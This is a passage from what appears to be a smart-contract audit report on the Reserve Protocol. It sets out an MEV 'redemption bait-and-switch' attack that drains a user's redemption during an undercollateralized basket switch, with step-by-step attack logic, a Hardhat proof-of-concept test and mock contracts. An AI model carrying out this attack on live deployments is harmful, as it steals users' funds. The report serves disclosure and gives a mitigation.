IRevenueShare +    let revShare2: IRevenueShare + +    let loadFixture: ReturnType<typeof createFixtureLoader> +    let wallet: Wallet + +    let stkWithdrawalDelay: string + + +    const toMinBuyAmt = async ( +        sellAmt: BigNumber, +        sellPrice: BigNumber, +        buyPrice: BigNumber +    ): Promise<BigNumber> => { +        // do all muls first so we don't round unnecessarily +        // a = loss due to max trade slippage +        // b = loss due to selling token at the low price +        // c = loss due to buying token at the high price +        // mirrors the math from TradeLib ~L:57 + +        const lowSellPrice = sellPrice.sub(sellPrice.mul(ORACLE_ERROR).div(BN_SCALE_FACTOR)) +        const highBuyPrice = buyPrice.add(buyPrice.mul(ORACLE_ERROR).div(BN_SCALE_FACTOR)) +        const product = sellAmt +            .mul(fp('1').sub(await backingManager.maxTradeSlippage())) // (a) +            .mul(lowSellPrice) // (b) + +        return divCeil(divCeil(product, highBuyPrice), fp('1')) // (c) +    } + +    let MockV3AggregatorFactory: ContractFactory +    let ERC20Factory: ContractFactory + + +    before('create fixture loader', async () => { +        ;[wallet] = (await ethers.getSigners()) as unknown as Wallet[] +        loadFixture = createFixtureLoader([wallet]) +    }) + +    beforeEach(async () => { +        ;[deployerUser, owner, addr1, addr2, addr3, beneficiary1, beneficiary2] = await ethers.getSigners() +            // Deploy fixture +            ; ({ rsr, compToken, gnosis, compAsset, basket, config, facade, facadeTest, deployer, collateral: collateralArray } = +                await loadFixture(defaultFixture)) +        // config.maxTradeSlippage = fp('0.49') // slippage whatever so we have fewer auctions to do +        // config.rTokenMaxTradeVolume = fp('1e9') // $1B +        MockV3AggregatorFactory = await ethers.getContractFactory( +            'MockV3Aggregator' +        ) +        const compChainlinkFeed: MockV3Aggregator = <MockV3Aggregator>( +            await MockV3AggregatorFactory.deploy(8, bn('1e8')) +        ) +        const ERC20: ContractFactory = await ethers.getContractFactory('ERC20Mock') +        shitToken = <ERC20Mock>await ERC20.deploy('shitToken Token', 'SHIT') +        shitToken2 = <ERC20Mock>await ERC20.deploy('shitToken Token', 'SHIT') + +        const ShitAssetFactory: ContractFactory = await ethers.getContractFactory('ShitAsset') +        shitAsset = <ShitAsset>( +            await ShitAssetFactory.deploy( +                PRICE_TIMEOUT, +                compChainlinkFeed.address, +                ORACLE_ERROR, +                shitToken.address, +                config.rTokenMaxTradeVolume, +                ORACLE_TIMEOUT +            ) +        ) +        await shitAsset.refresh() + +        notSoShitAsset = <ShitAsset>( +            await ShitAssetFactory.deploy( +                PRICE_TIMEOUT, +                compChainlinkFeed.address, +                ORACLE_ERROR, +                shitToken2.address, +                config.rTokenMaxTradeVolume, +                ORACLE_TIMEOUT +            ) +        ) +        await notSoShitAsset.refresh() + +        // Get assets and tokens +        tokenAsset = <FiatCollateral>basket[0] +        usdcAsset = <FiatCollateral>basket[1] +        cTokenAsset = <CTokenFiatCollateral>basket[3] + +        token = <ERC20Mock>await ethers.getContractAt('ERC20Mock', await tokenAsset.erc20()) +        usdc = <USDCMock>await ethers.getContractAt('USDCMock', await usdcAsset.erc20()) +        cToken = <CTokenMock>await ethers.getContractAt('CTokenMock', await cTokenAsset.erc20()) + +        // Deploy DFacadeWriteLib lib +        const facadeWriteLib = await (await ethers.getContractFactory('FacadeWriteLib')).deploy() +        facadeWriteLibAddr = facadeWriteLib.address + +        // Deploy Facade +        const FacadeFactory: ContractFactory = await ethers.getContractFactory('PatrickFacadeWrite', { +            libraries: { +                FacadeWriteLib: facadeWriteLibAddr, +            }, +        }) +        facadeWrite = <PatrickFacadeWrite>await FacadeFactory.deploy(deployer.address) + +        // const FacadeReadFactory: ContractFactory = await ethers.getContractFactory('FacadeRead') +        // const facade = <FacadeRead>await FacadeReadFactory.deploy() + +        revShare1 = { rTokenDist: bn('2'), rsrDist: bn('3') } // 0.5% for beneficiary1 +        revShare2 = { rTokenDist: bn('4'), rsrDist: bn('6') } // 1% for beneficiary2 + +        // Decrease revenue splits for nicer rounding +        config.dist.rTokenDist = bn('394') +        config.dist.rsrDist = bn('591') + +        // Set parameters +        rTokenConfig = { +            name: 'RTKN RToken', +            symbol: 'RTKN', +            mandate: 'mandate', +            params: config, +        } + +        rTokenSetup = { +            assets: [shitAsset.address], +            primaryBasket: [shitAsset.address], +            weights: [fp('1')], // 1 RT = [1 shitAsset] +            backups: [], +            beneficiaries: [ +                { beneficiary: beneficiary1.address, revShare: revShare1 }, +                { beneficiary: beneficiary2.address, revShare: revShare2 }, +            ], +        } + +        badBackupRTokenSetup = { +            assets: [], +            primaryBasket: [shitAsset.address], // target name is shit +            weights: [fp('1')], // 1 RT = [1 shitAsset] +            backups: [{ +                backupUnit: ethers.utils.formatBytes32String('shit'), +                diversityFactor: bn('1'), // max +                backupCollateral: [notSoShitAsset.address], +            }], +            beneficiaries: [] +        } + +        // Set governance params +        govParams = { +            votingDelay: bn(5), // 5 blocks +            votingPeriod: bn(100), // 100 blocks +            proposalThresholdAsMicroPercent: bn(1e6), // 1% +            quorumPercent: bn(4), // 4% +            timelockDelay: bn(60 * 60 * 24), // 1 day +        } +        rTokenSetup.beneficiaries = [ +            { beneficiary: beneficiary1.address, revShare: { rsrDist: bn(1), rTokenDist: bn(0) } }, +        ] +        // Deploy RToken via FacadeWrite +        const receipt = await ( +            await facadeWrite.connect(deployerUser).deployRToken(rTokenConfig, badBackupRTokenSetup) +        ).wait() +        // const rToken = <TestIRToken>await ethers.getContractAt('TestIRToken', await main.rToken()) +        const mainAddr = expectInIndirectReceipt(receipt, deployer.interface, 'RTokenCreated').args.main +        main = <TestIMain>await ethers.getContractAt('TestIMain', mainAddr) +        rToken = <TestIRToken>await ethers.getContractAt('TestIRToken', await main.rToken()) +        assetRegistry = <IAssetRegistry>( +            await ethers.getContractAt('IAssetRegistry', await main.assetRegistry()) +        ) + +        await assetRegistry.connect(deployerUser).register(shitAsset.address) + +        backingManager = <TestIBackingManager>( +            await ethers.getContractAt('TestIBackingManager', await main.backingManager()) +        ) +        basketHandler = <IBasketHandler>( +            await ethers.getContractAt('IBasketHandler', await main.basketHandler()) +        ) + +        rsrTrader = <TestIRevenueTrader>( +            await ethers.getContractAt('TestIRevenueTrader', await main.rsrTrader()) +        ) +        rTokenTrader = <TestIRevenueTrader>( +            await ethers.getContractAt('TestIRevenueTrader', await main.rTokenTrader()) +        ) + +        distributor = <TestIDistributor>( +            await ethers.getContractAt('TestIDistributor', await main.distributor()) +        ) + +        stRSR = <TestIStRSR>await ethers.getContractAt('TestIStRSR', await main.stRSR()) +        stkWithdrawalDelay = bn(await stRSR.unstakingDelay()).toString() + +        furnace = <TestIFurnace>await ethers.getContractAt('TestIFurnace', await main.furnace()) +        ERC20Factory = await ethers.getContractFactory('ERC20Mock') +    }) + +    context("When protocol is uncollateralized & collateral is sound", function () { +        let tokenA: ERC20Mock +        let tokenB: ERC20Mock +        let tokenAAsset: FiatCollateral +        let tokenBAsset: FiatCollateral +        let mintBalance: BigNumber +        let issueAmount: BigNumber + +        const printValues = async () => { +            console.log("Addr1 tokenA balance: ", (await tokenA.balanceOf(addr1.address)).toString()) +            console.log("Addr1 tokenB balance: ", (await tokenB.balanceOf(addr1.address)).toString()) +            console.log("Addr1 rToken balance: ", (await rToken.balanceOf(addr1.address)).toString()) + +            console.log("Addr2 tokenA balance: ", (await tokenA.balanceOf(addr2.address)).toString()) +            console.log("Addr2 tokenB balance: ", (await tokenB.balanceOf(addr2.address)).toString()) +            console.log("Addr2 rToken balance: ", (await rToken.balanceOf(addr2.address)).toString()) + +            console.log("Addr3 tokenA balance: ", (await tokenA.balanceOf(addr3.address)).toString()) +            console.log("Addr3 tokenB balance: ", (await tokenB.balanceOf(addr3.address)).toString()) +            console.log("Addr3 rToken balance: ", (await rToken.balanceOf(addr3.address)).toString()) +            console.log("Addr3 rsr balance: ", (await rsr.balanceOf(addr3.address)).toString()) + +            console.log("Protocol tokenA balance: ", (await tokenA.balanceOf(backingManager.address)).toString()) +            console.log("Protocol tokenB balance: ", (await tokenB.balanceOf(backingManager.address)).toString()) +            console.log("Protocol rToken balance: ", (await rToken.balanceOf(backingManager.address)).toString()) + +            console.log("rTokenTrader tokenA balance: ", (await tokenA.balanceOf(rTokenTrader.address)).toString()) +            console.log("rTokenTrader tokenB balance: ", (await tokenB.balanceOf(rTokenTrader.address)).toString()) +            console.log("rTokenTrader rToken balance: ", (await rToken.balanceOf(rTokenTrader.address)).toString()) + +            console.log("rsrTrader tokenA balance: ", (await tokenA.balanceOf(rsrTrader.address)).toString()) +            console.log("rsrTrader tokenB balance: ", (await tokenB.balanceOf(rsrTrader.address)).toString()) +            console.log("rsrTrader rToken balance: ", (await rToken.balanceOf(rsrTrader.address)).toString()) + +            console.log("gnosis tokenA balance: ", (await tokenA.balanceOf(gnosis.address)).toString()) +            console.log("gnosis tokenB balance: ", (await tokenB.balanceOf(gnosis.address)).toString()) +            console.log("gnosis rToken balance: ", (await rToken.balanceOf(gnosis.address)).toString()) + +            console.log("furnace tokenA balance: ", (await tokenA.balanceOf(furnace.address)).toString()) +            console.log("furnace tokenB balance: ", (await tokenB.balanceOf(furnace.address)).toString()) +            console.log("furnace rToken balance: ", (await rToken.balanceOf(furnace.address)).toString()) + +            console.log("rtoken total supply: ", (await rToken.totalSupply()).toString()) +            console.log("Fully collateralized?: ", (await basketHandler.fullyCollateralized()).toString()) +        } + +        beforeEach(async function () { +            const defaultThreshold = fp('0.05') // 5% +            const delayUntilDefault = bn('86400') // 24h +            const chainlinkFeed: MockV3Aggregator = <MockV3Aggregator>( +                await MockV3AggregatorFactory.deploy(8, bn('1e8')) +            ) +            tokenA = <ERC20Mock>await ERC20Factory.deploy("AToken", "AT") +            const FiatCollateralFactory: ContractFactory = await ethers.getContractFactory('FiatCollateral') +            tokenAAsset = <FiatCollateral>( +                await FiatCollateralFactory.deploy( +                    { +                        priceTimeout: PRICE_TIMEOUT, +                        chainlinkFeed: chainlinkFeed.address, +                        oracleError: ORACLE_ERROR, +                        erc20: tokenA.address, // tokenA is the collateral +                        maxTradeVolume: config.rTokenMaxTradeVolume, +                        oracleTimeout: ORACLE_TIMEOUT, +                        targetName: ethers.utils.formatBytes32String('USD'), +                        defaultThreshold: defaultThreshold, +                        delayUntilDefault: delayUntilDefault, +                    } +                ) +            ) +            await assetRegistry.register(tokenAAsset.address) +            tokenB = <ERC20Mock>await ERC20Factory.deploy("BToken", "BT") +            tokenBAsset = <FiatCollateral>( +                await FiatCollateralFactory.deploy( +                    { +                        priceTimeout: PRICE_TIMEOUT, +                        chainlinkFeed: chainlinkFeed.address, +                        oracleError: ORACLE_ERROR, +                        erc20: tokenB.address, // tokenB is the collateral +                        maxTradeVolume: config.rTokenMaxTradeVolume, +                        oracleTimeout: ORACLE_TIMEOUT, +                        targetName: ethers.utils.formatBytes32String('USD'), +                        defaultThreshold: defaultThreshold, +                        delayUntilDefault: delayUntilDefault, +                    } +                ) +            ) +            await assetRegistry.register(tokenBAsset.address) +            await backingManager.connect(deployerUser).grantRTokenAllowance(tokenA.address) +            await backingManager.connect(deployerUser).grantRTokenAllowance(tokenB.address) + +            // 2. Set prime basket to token A and have addr1 mint 10 tokens +            await basketHandler.connect(deployerUser).setPrimeBasket([tokenA.address], [fp('1')]) +            await basketHandler.refreshBasket() +            mintBalance = bn('10e18') // fast issue +            await tokenA.connect(addr1).mint(addr1.address, mintBalance) +            await tokenA.connect(addr1).approve(rToken.address, mintBalance) +            issueAmount = mintBalance +            await rToken.connect(addr1)['issue(uint256)'](issueAmount) // addr1 has 1 RToken, protocol has 1 tokenA + +            expect(await basketHandler.fullyCollateralized()).to.be.true +            expect(await basketHandler.status()).to.equal(0) // sound collateral +            expect(await rToken.balanceOf(addr1.address)).to.equal(issueAmount) // addr1 has 10 rTokens +            expect(await tokenA.balanceOf(addr1.address)).to.equal(0) // addr1 has no tokenA since it's deposited +            expect(await tokenB.balanceOf(addr1.address)).to.equal(0) // addr1 has no tokenB since they didn't mint +        }) +        it('Medium Severity: Allowing Issuance and redemptions during non-fully collateralized is an MEV risk: redemption bait-n-switch', async () => { +            // Difficulty: Medium +            //    The protocol would have to be uncollateralized (during a switch basket perhaps), and the new users would have to know that this is an attack vector +            // Impact: Medium +            //    New users can accidentally lose their funds if they don't know not to redeem/issue when undercollateralized.  +            // Mitigation: +            //    Disallow redemptions and issuances when the protocol is undercollateralized + +            // And our second user starts with 10 tokenB +            await tokenB.connect(addr2).mint(addr2.address, mintBalance) +            await basketHandler.connect(deployerUser).setPrimeBasket([tokenB.address], [fp('1')]) + +            // addr1 would like to redeem their 10 tokenA, but they don't realize the protocol is about to switch basket +            // so they send their TX to redeem their 10 tokenA, but oh no!!! an MEV bot got to them first! +            // if tokenA becomes disabled, anyone can call this, even if it's for 1 block +            await basketHandler.refreshBasket() +            const evilAmount = mintBalance.div(100000) +            await tokenB.connect(addr2).transfer(backingManager.address, evilAmount) +            // now, they blow all their RTokens for almost nothing! +            await rToken.connect(addr1).redeem(issueAmount) +            expect(await tokenA.balanceOf(addr1.address)).to.equal(0) +            expect(await rToken.balanceOf(addr1.address)).to.equal(0) +            expect(await tokenB.balanceOf(addr1.address)).to.equal(evilAmount) +            // the BM now has their funds, get rekt scrub! +            expect(await tokenA.balanceOf(backingManager.address)).to.equal(mintBalance) +        }) +    }) +}) ```
# Lines of code  https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L420   # Vulnerability details  ## Impact During recollateralization/a switch basket/when the protocol collateral isn't sound, a user can have almost their entire redemption transaction hot swapped for nothing.   For example, trying to redeem 1M collateral for 1M rTokens could have the user end up with 0 collateral and 0 rTokens, just by calling the `redeem` function at the wrong time.   Example: - User A issues 1M rToken for 1M tokenA - Evil user sees tokenA is about to become disabled, and that User A sent a normally innocuous redeem tx for too much underlying collateral in the mempool  - Evil user orders transactions so they and RSR/Rtoken holders can steal user A's funds  - They first buy a ton of tokenA and send it to the backing Manager - They call `manageTokens` which flash issues a ton of new Rtoken due to the inflated tokenA balance, increasing the totalSupply - The increase in total supply allows the normal redemption cap to be drastically lifted - They then let the disabling of tokenA process, and calls refreshBasket where a backup token (tokenB) kicks in - We are now undercollateralized, and evil user sends tokenB dust to the backingmanager  - FINALLY: the original redemption TX is ordered, and due to the inflated RToken supply, the battery discharge amount is also inflated, allowing the redemption to go through. Due to the new collateral in place, they redeem ALL their Rtoken (1M) for dust of tokenB!! The protocol has essentially honeypotted them!!  ## Proof of Concept We provide the proof of code in [proof of code](#proof-of-code).   1. MEV  This relies on a validator being malicious with for-profit motives. It would be pretty easy for them to setup a bot looking for this exact scenario though and just staying dormant till the time is right. If they get to order the transactions, they can make a fat profit from the victim.   2. Backing manager can flash issue RToken  If the backingManger has too many excess assets, it will flash issue as [many RTokens as](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BackingManager.sol#L201) possible to even the collateral to RTokens.  ``` function handoutExcessAssets(IERC20[] calldata erc20s) private { . . if (held.gt(needed)) { . . rToken.mint(address(this), uint256(rTok)); ```  3. Increasing the supply increases the redemption and issuance block cap  The RedemptionBattery's currentCharge function is [dependent on the total supply of RTokens](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/libraries/RedemptionBattery.sol#L59). So if the total supply is raised, you can redeem way more than you should be able to.  ``` uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256; ```  (This also is true for issuance.)  4. Anyone can call [refreshBasket when a collateral](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BasketHandler.sol#L179) is disabled  ``` function refreshBasket() external {         assetRegistry.refresh();          require(             main.hasRole(OWNER, _msgSender()) ||                 (status() == CollateralStatus.DISABLED && !main.pausedOrFrozen()),             "basket unrefreshable"         );         _switchBasket();     } ```  So if I see a tx where a collateral is about to be disabled, I can chain it with the refreshbasket TX myself.  5. Redemptions can occur when protocol is undercollateralized  The `redeem` function has this check:  ``` require(basketHandler.status() != CollateralStatus.DISABLED, "collateral default"); ```  Which checks if the collateral is good, but NOT if the protocol is fullyCollateralized. Since we chain the disabled asset with the refreshBasket TX, the backup collateral kicks in, and the collateral status becomes `SOUND`. However, normally, we'd have 0 of the new collateral and any redemptions would fail, since there isn't anything to give back.  6. Sending dust to backing manager  So, if you send a tiny tiny bit of the new collateral to the protocol, the protocol will process the redemption and give them their `prorata` share of the collateral, which right now is almost 0, but still burn all the rToken being redeemed.  [RToken.sol](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L475) ``` // amount is never changed, they burn all the rToken // in our example above, all 1M Rtoken are burned! _burn(redeemer, amount); ``` And we calculate how much they get back like so. We see how much $ we currently have in the basket, and hand back those amounts accordingly. Since we have almost no money, we are going to give them almost nothing for their rTokens.  ``` (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR); uint256 erc20length = erc20s.length; // Bound each withdrawal by the prorata share, in case we're currently under-collateralized         for (uint256 i = 0; i < erc20length; ++i) {             // {qTok}             uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));              // gas-optimization: only do the full mulDiv256 if prorate is 0             uint256 prorata = (prorate > 0)                 ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18                 : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}              if (prorata < amounts[i]) amounts[i] = prorata;         } ```  And just like that, a seemingly innocuous redemption transaction was a trap the whole time. The next step would be to go through the rest of the process to see how much our evil user profited (from running the auctions), as they need to be a whale to inflate the RToken supply. However, we've seen attacks like this, and one could consider it a [highly profitable trading strategy](https://twitter.com/avi_eisen/status/1581326197241180160?s=20&t=8WpEg76bW_Kk8YaJ5orP5Q). If they buy up majority shares in the RToken, or, they coordinate with most of the StRSR token holders they could advertise and honey pot people to do redemptions whenever a switchBasket is coming. Spread FUD like "you need to redeem otherwise you'll lose money!" and it's the redeeming that actually steals their money.   ## Tools Used  Hardhat  ## Recommended Mitigation Steps  Disallow issuance/redemptions while the protocol is undercollateralized.   ## Proof Of Code To run: 1. git clone https://github.com/reserve-protocol/protocol.git 2. cd protocol 3. Copy paste the below code to a file like `/tmp/changes.patch` 4. git apply /tmp/changes.patch 5. yarn 6. yarn hardhat test test/mev-redemption.ts  ``` diff --git a/contracts/ShitAsset.sol b/contracts/ShitAsset.sol new file mode 100644 index 00000000..5420e914 --- /dev/null +++ b/contracts/ShitAsset.sol @@ -0,0 +1,222 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol"; +import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol"; +import "./plugins/assets/OracleLib.sol"; +import "hardhat/console.sol"; + +contract ShitAsset { +    using FixLib for uint192; +    using OracleLib for AggregatorV3Interface; + +    // AggregatorV3Interface public immutable chainlinkFeed; // {UoA/tok} + +    IERC20Metadata private s_erc20; +    bool revertErc20 = false; + +    CollateralStatus myStatus; + +    uint8 public immutable erc20Decimals; + +    uint192 public immutable maxTradeVolume; // {UoA} + +    uint48 public immutable oracleTimeout; // {s} Seconds that an oracle value is considered valid + +    // uint192 public immutable oracleError; // {1} The max % deviation allowed by the oracle + +    // === Lot price === + +    uint48 public immutable priceTimeout; // {s} The period over which `savedHighPrice` decays to 0 + +    uint192 public savedLowPrice; // {UoA/tok} The low price of the token during the last update + +    uint192 public savedHighPrice; // {UoA/tok} The high price of the token during the last update + +    uint48 public lastSave; // {s} The timestamp when prices were last saved + +    string public name; + +    /// @param priceTimeout_ {s} The number of seconds over which savedHighPrice decays to 0 +    /// @param chainlinkFeed_ Feed units: {UoA/tok} +    /// @param oracleError_ {1} The % the oracle feed can be off by +    /// @param maxTradeVolume_ {UoA} The max trade volume, in UoA +    /// @param oracleTimeout_ {s} The number of seconds until a oracle value becomes invalid +    constructor( +        uint48 priceTimeout_, +        AggregatorV3Interface chainlinkFeed_, +        uint192 oracleError_, // @follow-up , this can change +        IERC20Metadata erc20_, +        uint192 maxTradeVolume_, +        uint48 oracleTimeout_ +    ) { +        require(priceTimeout_ > 0, "price timeout zero"); +        require(address(chainlinkFeed_) != address(0), "missing chainlink feed"); +        require(oracleError_ > 0 && oracleError_ < FIX_ONE, "oracle error out of range"); +        require(address(erc20_) != address(0), "missing erc20"); +        require(maxTradeVolume_ > 0, "invalid max trade volume"); +        require(oracleTimeout_ > 0, "oracleTimeout zero"); +        priceTimeout = priceTimeout_; +        // chainlinkFeed = chainlinkFeed_; +        // oracleError = oracleError_; +        s_erc20 = erc20_; +        // erc20 = IERC20Metadata(0x000000000000000000000000000000000000dEaD); +        erc20Decimals = s_erc20.decimals(); +        maxTradeVolume = maxTradeVolume_; +        oracleTimeout = oracleTimeout_; +        myStatus = CollateralStatus.SOUND; +        savedLowPrice = 0; +        savedHighPrice = 0; +    } + +    function updateErc20(address newErc20) public { +        if (newErc20 == address(0)) { +            revertErc20 = true; +        } +        s_erc20 = IERC20Metadata(newErc20); +    } + +    /// Can revert, used by other contract functions in order to catch errors +    /// Should not return FIX_MAX for low +    /// Should only return FIX_MAX for high if low is 0 +    /// @dev The third (unused) variable is only here for compatibility with Collateral +    /// @param low {UoA/tok} The low price estimate +    /// @param high {UoA/tok} The high price estimate +    function tryPrice() external view virtual returns (uint192 low, uint192 high, uint192) { +        // uint192 p = chainlinkFeed.price(oracleTimeout); // {UoA/tok} +        // uint192 delta = p.mul(oracleError); +        // return (p - delta, p + delta, 0); +        return (savedLowPrice, savedHighPrice, uint192(0)); +    } + +    function updatePrice(uint192 low, uint192 high) public { +        savedLowPrice = uint192(low); +        savedHighPrice = uint192(high); +        lastSave = uint48(block.timestamp); +    } + +    /// Should not revert +    /// Refresh saved prices +    function refresh() public virtual { +        // // @follow-up +        // // wonder if you could make this more gas efficient returning _? +        // try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +        //     // {UoA/tok}, {UoA/tok} +        //     // (0, 0) is a valid price; (0, FIX_MAX) is unpriced +        //     // Save prices if priced +        //     if (high < FIX_MAX) { +        //         savedLowPrice = low; +        //         savedHighPrice = high; +        //         lastSave = uint48(block.timestamp); +        //     } else { +        //         // must be unpriced +        //         // @follow-up +        //         // @pat why not revert here? +        //         assert(low == 0); +        //     } +        // } catch (bytes memory errData) { +        //     // see: docs/solidity-style.md#Catching-Empty-Data +        //     // @follow-up their docs should be updated, they no longer apply to this... +        //     // Why are they not being marked to iffy here? +        //     if (errData.length == 0) revert(); // solhint-disable-line reason-string +        // } +    } + +    // Should not revert +    //@dev Should be general enough to not need to be overridden +    // @return {UoA/tok} The lower end of the price estimate +    // @return {UoA/tok} The upper end of the price estimate +    function price() public view virtual returns (uint192, uint192) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            assert(low <= high); +            return (low, high); +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string +            return (0, FIX_MAX); +        } +    } + +    // Should not revert +    // lotLow should be nonzero when the asset might be worth selling +    // @dev Should be general enough to not need to be overridden +    // @return lotHigh {UoA/tok} The upper end of the lot price estimate +    function lotPrice() external view virtual returns (uint192 lotLow, uint192 lotHigh) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            // if the price feed is still functioning, use that +            lotLow = low; +            lotHigh = high; +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string + +            // if the price feed is broken, use a decayed historical value + +            uint48 delta = uint48(block.timestamp) - lastSave; // {s} +            if (delta >= priceTimeout) return (0, 0); // no price after timeout elapses + +            // {1} = {s} / {s} +            uint192 lotMultiplier = divuu(priceTimeout - delta, priceTimeout); + +            // {UoA/tok} = {UoA/tok} * {1} +            lotLow = savedLowPrice.mul(lotMultiplier); +            lotHigh = savedHighPrice.mul(lotMultiplier); +        } +        assert(lotLow <= lotHigh); +    } + +    // @return {tok} The balance of the ERC20 in whole tokens +    function bal(address account) external view returns (uint192) { +        return shiftl_toFix(s_erc20.balanceOf(account), -int8(erc20Decimals)); +    } + +    function isCollateral() external pure virtual returns (bool) { +        return true; +    } + +    // solhint-disable no-empty-blocks + +    /// Claim rewards earned by holding a balance of the ERC20 token +    /// @dev Use delegatecall +    function claimRewards() external virtual {} + +    // solhint-enable no-empty-blocks +    enum CollateralStatus { +        SOUND, +        IFFY, // When a peg is not holding or a chainlink feed is stale +        DISABLED // When the collateral has completely defaulted +    } + +    function updateStatus(CollateralStatus newStatus) public { +        myStatus = newStatus; +    } + +    // collateral stuff +    function status() public view returns (CollateralStatus) { +        return myStatus; +    } + +    function updateName(string memory newName) public { +        name = newName; +    } + +    function targetName() public view returns (bytes32) { +        // this is "shit" in hex +        return 0x7368697400000000000000000000000000000000000000000000000000000000; +    } + +    function targetPerRef() public view returns (uint192) { +        return FIX_ONE; +    } + +    function refPerTok() public view returns (uint192) { +        return FIX_ONE; +    } + +    function erc20() public view returns (IERC20Metadata) { +        if (revertErc20) { +            revert("revertErc20"); +        } +        return s_erc20; +    } +} diff --git a/contracts/facade/PatrickFacadeWrite.sol b/contracts/facade/PatrickFacadeWrite.sol new file mode 100644 index 00000000..72be7d3a --- /dev/null +++ b/contracts/facade/PatrickFacadeWrite.sol @@ -0,0 +1,214 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "../interfaces/IFacadeWrite.sol"; +import "./lib/FacadeWriteLib.sol"; +import "hardhat/console.sol"; + +/** + * @title FacadeWrite + * @notice A UX-friendly layer to interact with the protocol + * @dev Under the hood, uses two external libs to deal with blocksize limits. + */ +contract PatrickFacadeWrite is IFacadeWrite { +    using FacadeWriteLib for address; + +    IDeployer public immutable deployer; + +    constructor(IDeployer deployer_) { +        require(address(deployer_) != address(0), "invalid address"); +        deployer = deployer_; +    } + +    /// Step 1 +    function deployRToken( +        ConfigurationParams calldata config, +        SetupParams calldata setup +    ) external returns (address) { +        // Perform validations +        require(setup.primaryBasket.length > 0, "no collateral"); +        require(setup.primaryBasket.length == setup.weights.length, "invalid length"); + +        // Validate backups +        for (uint256 i = 0; i < setup.backups.length; ++i) { +            require(setup.backups[i].backupCollateral.length > 0, "no backup collateral"); +        } + +        // Validate beneficiaries +        for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +            require( +                setup.beneficiaries[i].beneficiary != address(0) && +                    (setup.beneficiaries[i].revShare.rTokenDist > 0 || +                        setup.beneficiaries[i].revShare.rsrDist > 0), +                "beneficiary revShare mismatch" +            ); +        } + +        // Deploy contracts +        IRToken rToken = IRToken( +            deployer.deploy( +                config.name, +                config.symbol, +                config.mandate, +                address(this), // set as owner +                config.params +            ) +        ); + +        // Get Main +        IMain main = rToken.main(); +        IAssetRegistry assetRegistry = main.assetRegistry(); +        IBackingManager backingManager = main.backingManager(); +        IBasketHandler basketHandler = main.basketHandler(); + +        // Register assets +        for (uint256 i = 0; i < setup.assets.length; ++i) { +            require(assetRegistry.register(setup.assets[i]), "duplicate asset"); +            backingManager.grantRTokenAllowance(setup.assets[i].erc20()); +        } + +        // Setup basket +        { +            IERC20[] memory basketERC20s = new IERC20[](setup.primaryBasket.length); + +            // Register collateral +            for (uint256 i = 0; i < setup.primaryBasket.length; ++i) { +                // require(assetRegistry.register(setup.primaryBasket[i]), "duplicate collateral"); +                assetRegistry.register(setup.primaryBasket[i]); +                IERC20 erc20 = setup.primaryBasket[i].erc20(); + +                basketERC20s[i] = erc20; +                backingManager.grantRTokenAllowance(erc20); +            } + +            // Set basket + +            // can't issue without setting and call ing refresh +            basketHandler.setPrimeBasket(basketERC20s, setup.weights); +            basketHandler.refreshBasket(); +        } + +        // Setup backup config +        { +            for (uint256 i = 0; i < setup.backups.length; ++i) { +                IERC20[] memory backupERC20s = new IERC20[]( +                    setup.backups[i].backupCollateral.length +                ); + +                for (uint256 j = 0; j < setup.backups[i].backupCollateral.length; ++j) { +                    ICollateral backupColl = setup.backups[i].backupCollateral[j]; +                    assetRegistry.register(backupColl); // do not require the asset is new +                    IERC20 erc20 = backupColl.erc20(); +                    backupERC20s[j] = erc20; +                    backingManager.grantRTokenAllowance(erc20); +                } + +                basketHandler.setBackupConfig( +                    setup.backups[i].backupUnit, +                    setup.backups[i].diversityFactor, +                    backupERC20s +                ); +            } +        } + +        // // Setup revshare beneficiaries +        // for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +        //     main.distributor().setDistribution( +        //         setup.beneficiaries[i].beneficiary, +        //         setup.beneficiaries[i].revShare +        //     ); +        // } + +        // // Pause until setupGovernance +        // main.pause(); + +        // // Setup deployer as owner to complete next step - do not renounce roles yet +        main.grantRole(OWNER, msg.sender); + +        // Return rToken address +        return address(rToken); +    } + +    /// Step 2 +    /// @return newOwner The address of the new owner +    function setupGovernance( +        IRToken rToken, +        bool deployGovernance, +        bool unpause, +        GovernanceParams calldata govParams, +        address owner, +        address guardian, +        address pauser +    ) external returns (address newOwner) { +        // Get Main +        IMain main = rToken.main(); + +        require(main.hasRole(OWNER, address(this)), "ownership already transferred"); +        require(main.hasRole(OWNER, msg.sender), "not initial deployer"); + +        // Remove ownership to sender +        main.revokeRole(OWNER, msg.sender); + +        if (deployGovernance) { +            require(owner == address(0), "owner should be empty"); + +            TimelockController timelock = new TimelockController( +                govParams.timelockDelay, +                new address[](0), +                new address[](0) +            ); + +            // Deploy Governance contract +            address governance = FacadeWriteLib.deployGovernance( +                IStRSRVotes(address(main.stRSR())), +                timelock, +                govParams.votingDelay, +                govParams.votingPeriod, 